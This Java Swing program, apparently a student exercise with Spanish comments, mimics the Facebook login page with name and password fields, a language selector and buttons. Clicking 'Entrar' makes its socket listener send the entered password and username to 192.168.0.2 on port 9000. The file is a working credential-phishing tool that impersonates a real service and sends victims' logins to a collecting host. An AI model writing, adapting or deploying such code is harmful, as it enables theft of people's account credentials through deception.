package FACEBOOK;

import java.awt.Color;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

import javax.swing.BorderFactory;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JRadioButton;
import javax.swing.JTextField;

public class facebook {
public static void main(String []args) {
	libro libro1=new libro();
	libro1.setVisible(true);
	libro1.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
}
}
class libro extends JFrame{
	public libro() {
		setSize(1600,800);
		setLocationRelativeTo(null);
		setResizable(false);
		book book1=new book();
		add(book1);
		book1.setBackground(Color.white);
		
	}
}
class book extends JPanel{
	private JLabel letrasup ,letraforget,mensaje1,mensaje2,mensaje3,mensaje4,mensaje5,mensaje6,mensaje7;
	private JLabel puntos,o,puntos1;
	private JTextField camponombre,campopassword;
	private JButton ENTRAR;
	private JButton CREAR;
	private JButton olvido;
	private JRadioButton espagnol, catala,aleman,frances,ingles,portugues,italiano;
	private int x=670;
	public book() {
		setLayout(null);
//configuracion del primero label---------------------------------
		letrasup=new JLabel("facebook");
		letrasup.setFont(new Font("Arial Black",Font.BOLD,24));
		letrasup.setForeground(new Color(165,105,189));
		letrasup.setBounds(700,30,500,50);
		add(letrasup);
//configuracion del label olvido----------------------------------------
letraforget=new JLabel("¿Has olvidado la contraseña?");		
letraforget.setBounds(x,210,340,40);
letraforget.setFont(new Font("Serif",Font.PLAIN,18));
letraforget.setForeground(Color.blue);
add(letraforget);
//configuracion del label puntos-------------------------------------
puntos=new JLabel("-------------------------------------     O       ------------------------------------------------ ");
puntos.setBounds(600,250,340,40);
add(puntos);
//configuracion del label mensaje1------------------------------------------------------------------------------------------
mensaje1=new JLabel("Español(España)");
mensaje1.setBounds(300,500,640,40);
mensaje1.setForeground(new Color(133, 146, 158 ));
add(mensaje1);
espagnol=new JRadioButton();
espagnol.setBounds(280,510,20,20);
espagnol.setBorder(BorderFactory.createEmptyBorder());
espagnol.setBackground(Color.white);
add(espagnol);

//configuracion del label mensaje2------------------------------------------------------------------------------------------
mensaje2=new JLabel("Català");
mensaje2.setBounds(320,520,640,40);
mensaje2.setForeground(new Color(133, 146, 158 ));
add(mensaje2);
catala=new JRadioButton();
catala.setBounds(280,530,20,20);
catala.setBorder(BorderFactory.createEmptyBorder());
catala.setBackground(Color.white);
add(catala);

//configuracion del label mensaje3------------------------------------------------------------------------------------------
mensaje3=new JLabel("Portuguès(Brasil)");
mensaje3.setBounds(300,540,640,40);
mensaje3.setForeground(new Color(133, 146, 158 ));
add(mensaje3);
portugues=new JRadioButton();
portugues.setBounds(280,550,20,20);
portugues.setBorder(BorderFactory.createEmptyBorder());
portugues.setBackground(Color.white);
add(portugues);

//configuracion del label mensaje4------------------------------------------------------------------------------------------
mensaje4=new JLabel("Italiano");
mensaje4.setBounds(320,560,640,40);
mensaje4.setForeground(new Color(133, 146, 158 ));
add(mensaje4);
italiano=new JRadioButton();
italiano.setBounds(280,570,20,20);
italiano.setBorder(BorderFactory.createEmptyBorder());
italiano.setBackground(Color.white);
add(italiano);


//configuracion mensaje5-----------------------------------------------------------------------------------------
mensaje5=new JLabel("English(US)");
mensaje5.setBounds(1000,510,640,40);
mensaje5.setForeground(new Color(133, 146, 158 ));
add(mensaje5);
ingles=new JRadioButton();
ingles.setBounds(980,520,20,20);
ingles.setBorder(BorderFactory.createEmptyBorder());
ingles.setBackground(Color.white);
add(ingles);

//configuracion del label mensaje6------------------------------------------------------------------------------------------
mensaje6=new JLabel("Frances(Fancia)");
mensaje6.setBounds(1000,530,640,40);
mensaje6.setForeground(new Color(133, 146, 158 ));
add(mensaje6);
frances=new JRadioButton();
frances.setBounds(980,540,20,20);
frances.setBorder(BorderFactory.createEmptyBorder());
frances.setBackground(Color.white);
add(frances);


//configuracion del label mensaje7------------------------------------------------------------------------------------------
mensaje7=new JLabel("Deutch");
mensaje7.setBounds(1000,550,640,40);
mensaje7.setForeground(new Color(133, 146, 158 ));
add(mensaje7);
aleman=new JRadioButton();
aleman.setBounds(980,560,20,20);
aleman.setBorder(BorderFactory.createEmptyBorder());
aleman.setBackground(Color.white);
add(aleman);



//configuracion del camponombre-------------------------------------------------------------------		
camponombre=new JTextField();
camponombre.setBackground(new Color(234, 237, 237));
camponombre.setBounds(600,80,340,40);
camponombre.setFont(new Font("Serif",Font.PLAIN,18));
camponombre.setBorder(BorderFactory.createEmptyBorder());
	add(camponombre);
//configuracion del campopasword-------------------------------------------------------------	
campopassword=new JTextField();
campopassword.setBackground(new Color(234, 237, 237));
campopassword.setBounds(600,130,340,40);
campopassword.setFont(new Font("Serif",Font.PLAIN,18));
campopassword.setBorder(BorderFactory.createEmptyBorder());
	add(campopassword);
//configuracion del boton entrar--------------------------------------------------------------
ENTRAR=new JButton("Entrar");
ENTRAR.setBackground(Color.blue);	
ENTRAR.setBounds(600,180,340,40);
ENTRAR.setForeground(Color.white);
ENTRAR.setFont(new Font("Arial Black",Font.PLAIN,18));
ENTRAR.setBorder(BorderFactory.createEmptyBorder());
    add(ENTRAR);
//configuracion del boton CREAR---------------------------------------------------------------
CREAR =new JButton("Crear cuenta nueva");
CREAR.setBackground(new Color(46, 204, 113  ));
CREAR.setForeground(Color.white);
CREAR.setFont(new Font("Arial Black",Font.PLAIN,14));
CREAR.setBounds(600,300,340,40);
CREAR.setBorder(BorderFactory.createEmptyBorder());
    add(CREAR);
//pniendo a la escucha los botones----------------------------------------------------
   oyentebotones1 variableoyente1=new oyentebotones1();
    ingles.addActionListener(variableoyente1);
	aleman.addActionListener(variableoyente1);
	portugues.addActionListener(variableoyente1);
	italiano.addActionListener(variableoyente1);
	
	ENTRAR.addActionListener(new oyentecampos());
	ENTRAR.addActionListener(new socket());
	
	}
//oyente para radio botones-------------------------------------------------------------------
	
class oyentebotones1 implements ActionListener{
	public void actionPerformed(ActionEvent e) {
if(ingles.isSelected()) {
	ENTRAR.setText("Get in");
	CREAR.setText("Make an new Account");
	letraforget.setText("Have you forgotten the password?");
	italiano.dispatchEvent(e);
	portugues.dispatchEvent(e);
	aleman.dispatchEvent(e);
	espagnol.dispatchEvent(e);
}
if(italiano.isSelected()) {
	ENTRAR.setText("Entra");
	CREAR.setText("Voglio aprire un conto di risparmio");
	letraforget.setText("Hai dimenticato la password?");
	ingles.dispatchEvent(e);
	portugues.dispatchEvent(e);
	aleman.dispatchEvent(e);
	espagnol.dispatchEvent(e);
 	
}
if(portugues.isSelected()) {
	ENTRAR.setText("Entrem");
	CREAR.setText("Primeiro passo é abrir uma nova conta");
	letraforget.setText("Você esqueceu a senha?");
	ingles.dispatchEvent(e);
	italiano.dispatchEvent(e);
	aleman.dispatchEvent(e);
	espagnol.dispatchEvent(e);

}
if(aleman.isSelected()) {
	letraforget.setBounds(600,210,340,40);
	ENTRAR.setText("Treten");
	CREAR.setText("Ein Konto erstellen");
	letraforget.setText("HABEN SIE DAS PASSWORT VERGESSEN?");
	ingles.dispatchEvent(e);
	italiano.dispatchEvent(e);
	portugues.dispatchEvent(e);
	espagnol.dispatchEvent(e);}}}
//------------------------------------------------------------------------
//interna de los campos-----------------------------------------------------------------

class oyentecampos implements ActionListener{
	public void actionPerformed(ActionEvent w) {
		String info=campopassword.getText();
		if(info.length()>8) {
			JOptionPane.showMessageDialog(null,"Numeros de caracteres no Permitifo");
		}
		if(info.length()<8) {
			JOptionPane.showMessageDialog(null,"Numeros de caracteres Insuficientes");
			
		}
		
	
	}	}

//interna de los sokcet
	class socket implements ActionListener{

	@Override
	public void actionPerformed(ActionEvent y) {
		// TODO Auto-generated method stub
		try {
		Socket misocket;
	
			
			 misocket=new Socket("192.168.0.2",9000);
			DataOutputStream escritura=new DataOutputStream(misocket.getOutputStream());
			escritura.writeUTF("\n"+"Password :"+campopassword.getText()+"\n"+"nombre :"+camponombre.getText());
		//misocket.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
		
	}
}






	
	
	
